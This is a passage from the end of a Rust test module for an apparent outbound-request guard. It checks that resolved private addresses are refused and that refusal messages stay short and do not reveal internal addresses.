        let ours: IpAddr = "192.168.1.10".parse().expect("an address");
        let theirs: IpAddr = "93.184.216.34".parse().expect("an address");
        assert!(refuses_resolved(&[theirs, ours]));
        assert!(refuses_resolved(&[ours]));
        assert!(!refuses_resolved(&[theirs]));
        // A name that answers with nothing has told us nothing.
        assert!(refuses_resolved(&[]));
    }

    #[test]
    fn every_refusal_is_one_line_and_never_the_address() {
        for refusal in [Refusal::Scheme, Refusal::Address, Refusal::Unchecked, Refusal::Credentials] {
            let reason = refusal.reason();
            assert!(reason.chars().count() < 160, "{reason}");
            assert!(!reason.contains("127.0.0.1") && !reason.contains("localhost"), "{reason}");
            assert!(!reason.contains("100.64"), "{reason}");
        }
    }

}
